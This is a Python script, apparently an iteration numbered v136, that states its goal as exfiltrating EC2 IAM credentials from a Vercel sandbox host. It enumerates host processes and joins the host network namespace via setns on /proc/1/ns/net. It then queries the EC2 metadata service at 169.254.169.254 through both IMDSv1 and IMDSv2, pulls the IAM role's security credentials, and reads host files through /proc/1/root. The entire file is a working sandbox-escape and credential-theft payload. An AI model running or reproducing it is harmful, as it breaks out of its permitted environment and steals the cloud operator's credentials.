# -*- coding: utf-8 -*-
"""v136 payload: setns /proc/1/ns/net (celld = host netns) -> EC2 IMDS 全套 + host 进程枚举
目标: EC2 IAM 凭据 exfil
输出 /vercel/sandbox/v136c.out"""
import socket, struct, time, json, os, signal, ctypes, urllib.request

OUT = '/vercel/sandbox/v136c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def read_proc(pid, fname, n=4000):
    try:
        return open('/proc/%d/%s' % (pid, fname), 'rb').read(n)
    except Exception as e:
        return b'EXC %s' % str(e).encode()


def http_req(url, method='GET', headers=None, timeout=5):
    try:
        req = urllib.request.Request(url, method=method, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(6000)
    except Exception as e:
        return 'EXC %s' % type(e).__name__, str(e).encode()


# 1: 枚举 host 进程（找 containerd/sandboxctrl/celld 真实 pid + 全部进程清单）
log('=== 1 proc enum ===')
procs = {}
for d in os.listdir('/proc'):
    if d.isdigit():
        try:
            procs[int(d)] = open('/proc/%s/comm' % d).read().strip()
        except Exception:
            pass
log('total procs: %d' % len(procs))
for p, c in sorted(procs.items()):
    if c in ('celld', 'containerd', 'sandboxctrl', 'sandbox-init', 'containerd-shim', 'sh', 'sleep'):
        log('proc %d comm=%s' % (p, c))

# 2: setns /proc/1/ns/net (celld = host) + IMDS
log('=== 2 setns celld netns + IMDS ===')
try:
    libc = ctypes.CDLL(None, use_errno=True)
    fd = os.open('/proc/1/ns/net', os.O_RDONLY)
    r = libc.setns(ctypes.c_int(fd), ctypes.c_int(0))
    err = ctypes.get_errno()
    log('setns /proc/1/ns/net rc=%d errno=%d' % (r, err))
    if r == 0:
        try:
            dev = read_proc(os.getpid(), 'net/dev', 3000).decode(errors='replace')
            log('net/dev after setns:\n' + dev)
        except Exception:
            pass
        try:
            rt = read_proc(os.getpid(), 'net/route', 2000).decode(errors='replace')
            log('net/route after setns:\n' + rt)
        except Exception:
            pass
        # IMDSv1
        for url in ['http://169.254.169.254/latest/meta-data/',
                    'http://169.254.169.254/latest/meta-data/instance-id',
                    'http://169.254.169.254/latest/meta-data/local-ipv4',
                    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                    'http://169.254.169.254/latest/dynamic/instance-identity/document']:
            st, body = http_req(url, timeout=4)
            log('IMDS1 GET %s -> %s %r' % (url.split('/latest')[-1], st, body[:600]))
        # IMDSv2
        st, body = http_req('http://169.254.169.254/latest/api/token', method='PUT',
                            headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'}, timeout=4)
        log('IMDS2 PUT token -> %s %r' % (st, body[:200]))
        if st == 200:
            tok = body.decode().strip()
            for url in ['http://169.254.169.254/latest/meta-data/',
                        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                        'http://169.254.169.254/latest/meta-data/iam/info',
                        'http://169.254.169.254/latest/dynamic/instance-identity/document']:
                st, body = http_req(url, headers={'X-aws-ec2-metadata-token': tok}, timeout=4)
                log('IMDS2 GET %s -> %s %r' % (url.split('/latest')[-1], st, body[:600]))
            # 拿 role 名 -> 凭据
            if isinstance(body, bytes) and b'role' in body.lower() or b'/' in body.decode(errors='replace'):
                st, body = http_req('http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                                    headers={'X-aws-ec2-metadata-token': tok}, timeout=4)
                role = body.decode(errors='replace').strip().split('\n')[0]
                log('role=%r' % role)
                if role and '/' not in role:
                    st, body = http_req('http://169.254.169.254/latest/meta-data/iam/security-credentials/%s' % role,
                                        headers={'X-aws-ec2-metadata-token': tok}, timeout=4)
                    log('CREDS %s -> %s %r' % (role, st, body[:2000]))
    else:
        log('setns failed errno=%d' % err)
except Exception as e:
    log('setns EXC %s' % e)

# 3: celld root 文件（host 配置）
log('=== 3 celld files ===')
R = '/proc/1/root'
for fp in ['opt/vercel/celld-init.sh', 'opt/vercel/celld', 'root/v135m.out']:
    try:
        st = os.stat('%s/%s' % (R, fp))
        log('FILE %s size=%d' % (fp, st.st_size))
        data = open('%s/%s' % (R, fp), 'rb').read(4000)
        log('FILE %s: %r' % (fp, data[:1500]))
    except Exception as e:
        log('FILE %s EXC %s' % (fp, e))
try:
    log('celld cmdline: %r' % read_proc(1, 'cmdline', 600).replace(b'\x00', b' '))
except Exception:
    pass

log('V136_DONE')
f.close()
